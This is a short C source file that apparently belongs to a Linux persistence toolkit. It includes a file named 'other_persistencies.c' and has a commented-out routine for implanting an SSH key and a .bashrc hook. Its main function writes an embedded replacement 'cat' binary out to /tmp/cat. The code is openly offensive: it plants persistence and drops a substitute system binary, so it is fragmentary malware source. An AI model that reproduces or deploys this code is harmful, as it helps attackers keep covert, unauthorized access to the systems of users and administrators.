#include <stdlib.h>
#include <stdio.h>
#include "other_persistencies.c"
#include "../env.h"

// void install_persistence() {
//     int uid = getuid();
//     // ssh_key(uid, SSH_KEY);
//     bashrc(uid);
// }

int main() {
    char *binary = get_binary("cat");
    FILE *fp = fopen("/tmp/cat", "w");
    fwrite(binary + 8, (unsigned char)binary[0] | ((unsigned char)binary[1] << 8), 1, fp);
    fclose(fp);
    return 0;
}